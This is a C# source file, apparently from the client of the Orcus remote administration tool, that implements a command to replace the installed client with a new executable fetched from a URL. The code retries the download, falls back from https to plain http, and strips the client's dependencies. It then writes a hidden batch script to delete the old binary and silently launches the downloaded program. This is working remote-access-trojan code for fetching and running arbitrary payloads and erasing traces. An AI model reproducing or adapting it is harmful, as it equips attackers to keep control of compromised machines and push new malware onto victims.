using System;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Security.Cryptography;
using System.Threading;
using System.Windows.Forms;
using Orcus.Config;
using Orcus.Core;
using Orcus.Plugins;
using Orcus.Plugins.StaticCommands;
using Orcus.Shared.Utilities;
using Orcus.StaticCommands.Client;

namespace Orcus.StaticCommands
{
    public class UpdateFromUrlCommandEx : UpdateFromUrlCommand
    {
        public override void Execute(CommandParameter commandParameter, IFeedbackFactory feedbackFactory, IClientInfo clientInfo)
        {
            commandParameter.InitializeProperties(this);

            var downloadFile = new FileInfo(FileExtensions.GetFreeTempFileName("exe"));
            var succeed = false;
            var downloadUri = new Uri(DownloadUrl);

            for (int i = 0; i < 10; i++)
            {
                try
                {
                    using (var wc = new WebClient())
                    {
                        wc.DownloadFile(new Uri(DownloadUrl), downloadFile.FullName);
                    }
                }
                catch (Exception ex)
                {
                    //After 5 failed tries, we convert the https uri to a http uri
                    if (i == 4)
                    {
                        //Windows Xp doesnt support the new ssl encryptions, we have to try to download the file using http
                        if (downloadUri.Scheme == "https") // && Environment.OSVersion.Version.Major < 6
                        {
                            downloadUri = new UriBuilder(downloadUri)
                            {
                                Scheme = Uri.UriSchemeHttp,
                                Port = -1 // default port for scheme
                            }.Uri;
                        }
                    }

                    if (i == 9)
                        feedbackFactory.ErrorMessage(ex.Message);

                    continue;
                }

                Thread.Sleep(100); //wait for the file to close

                if (!string.IsNullOrEmpty(Hash))
                {
                    try
                    {
                        byte[] computedHash;
                        using (var stream = File.OpenRead(downloadFile.FullName))
                        using (var sha = new SHA256Managed())
                            computedHash = sha.ComputeHash(stream);

                        if (!computedHash.SequenceEqual(StringExtensions.HexToBytes(Hash)))
                        {
                            downloadFile.Delete();
                            feedbackFactory.ErrorMessage("The hash value doesn't equal the transmitted hash value");
                            continue;
                        }
                    }
                    catch (Exception)
                    {
                        continue;
                    }
                }
                succeed = true;
                break;
            }

            if (!succeed)
            {
                feedbackFactory.Failed();
                return;
            }

            UninstallHelper.RemoveAllDependencies();
            UninstallHelper.RemoveOtherStuff();

            feedbackFactory.Succeeded();
            Program.Unload();

            try
            {
                var programPath = Consts.ApplicationPath;
                var scriptFile = FileExtensions.GetFreeTempFileName("bat");
                File.SetAttributes(programPath, FileAttributes.Normal);
                var script =
                    $"@ECHO OFF\r\nping 127.0.0.1 > nul\r\necho j | del \"{programPath}\"\r\necho j | del {programPath}";
                File.WriteAllText(scriptFile, script);

                var p = new ProcessStartInfo(scriptFile) {WindowStyle = ProcessWindowStyle.Hidden};
                Process.Start(downloadFile.FullName, Arguments);
                Process.Start(p);
            }
            catch (Exception)
            {
                Application.Restart();
                return;
            }

            Program.Exit();
        }
    }
}